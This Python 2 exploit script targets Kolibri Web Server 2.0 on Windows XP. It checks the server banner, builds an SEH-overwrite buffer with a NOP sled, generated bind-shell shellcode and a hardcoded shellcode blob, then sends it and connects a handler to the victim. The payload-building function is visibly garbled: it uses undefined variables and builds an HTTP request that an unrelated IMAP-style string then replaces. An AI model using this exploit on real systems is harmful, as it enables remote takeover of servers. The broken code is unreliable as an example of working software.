#!/usr/bin/env python
"""
    nullsploit :: Remote Code Executon for Kolibri Web Server 2.0

    AUTHOR :: TheXero
    WEBSITE :: www.nullsecurity.net

"""
import sys
if "." not in sys.path: 
    sys.path.append(".")
import struct
import shellcode
import exploitutils
import time

TARGETS                         = {
    0 : ['Koliri 2.0 on Windows XP', struct.pack("<I", 0x77c35459)]}

def main():
    parser = exploitutils.arguments()
    args = parser.parse_args()

    if args.PORT:
        PORT = int(args.PORT)
    else:
        PORT = int(8080)
   
    if args.PAYLOAD:
        PAYLOAD = str(args.PAYLOAD)
    else:
        PAYLOAD = 'win32bind'
    
    if args.PARGS:
        PARGS = args.PARGS
    else:
        PARGS = ''
 
    if args.targets:
        print " Exploit targets available:"
        print " ========================="
        for i in TARGETS:
            print " " + str(i) + " | " + TARGETS[i][0]
        sys.exit()

    if args.RHOST:
        HOST = str(args.RHOST)
    else:
        parser.print_help()
        sys.exit()

    if args.check:
        checkVulnerability( HOST, PORT )
        sys.exit()
    
    if args.TARGET:
        TARGET = TARGETS[int(args.TARGET)][1]
    else:
        print " [!] Automatic target selection"
        TARGET = checkVulnerability( HOST, PORT )

    if args.force:
        if not args.TARGET:
            print " [!] Set a target before launching exploit"
            sys.exit()
        run( HOST, PORT, TARGET, PAYLOAD, PARGS )
        sys.exit()
   
    run( HOST, PORT, TARGET, PAYLOAD, PARGS)

def checkVulnerability(HOST, PORT):
    # Check banner
    response = exploitutils.bannerchecktest(HOST, PORT)
    
    for i in TARGETS:
        if TARGETS[i][0] in response:
            print " Received %s" % response
            print " [+] Target appears exploitable"
            return TARGETS[i][1]

    print " [-] Target is not vulnerable"
    sys.exit()

def makeSploit( TARGET, PAYLOAD, PARGS ):
    """
    Construct the attack
    """
    OFFSET=515
    BADCHARS='\x00\x0a\x0d'
    stack= "\x90"*12
    stack+= shellcode.generateshellcode( PAYLOAD, BADCHARS, str(PARGS) )
    stack+= exploitutils.randomstring( OFFSET - len(stack))
    stack+= "\xeb\x06\x90\x90" # Next SEH
    stack+= TARGET # SEH
    stack+=("\xdb\xc5\xbd\xfc\x37\x63\x33\xd9\x74\x24\xf4\x5f\x29\xc9\xb1\x03"
    "\x31\x6f\x17\x83\xc7\x04\x03\x93\x24\x81\xc6\xea\x8f\x81\x2c\xec"
    "\x0f\xf5\xcb")
    
    junk = "".join(choice(ascii_uppercase) for i in range(off_set - len(egg +
        shellcode)))
    junk2 = "".join(choice(ascii_uppercase) for i in range(822 - len(egg + shellcode
        + junk + ret + egg_hunter)))
    SPLOITSTRING = ("HEAD /" + egg + shellcode + junk + ret + egg_hunter + 
            " HTTP/1.0\r\n\r\n")    

    SPLOITSTRING = "a0001 LIST }" + stack + "}\r\n"
    return SPLOITSTRING

def run( HOST, PORT, TARGET, PAYLOAD, PARGS ):
   
    SPLOITSTRING = makeSploit( TARGET, PAYLOAD, PARGS )
    SUCCESS = exploitutils.tcpexploit( HOST, PORT, SPLOITSTRING )
    if SUCCESS != True:
        print " [-] Exploit failed!"
        sys.exit()
    print "Waiting for exploit to finish"
    time.sleep(5)
    exploitutils.handler( HOST, PAYLOAD )
    
main()
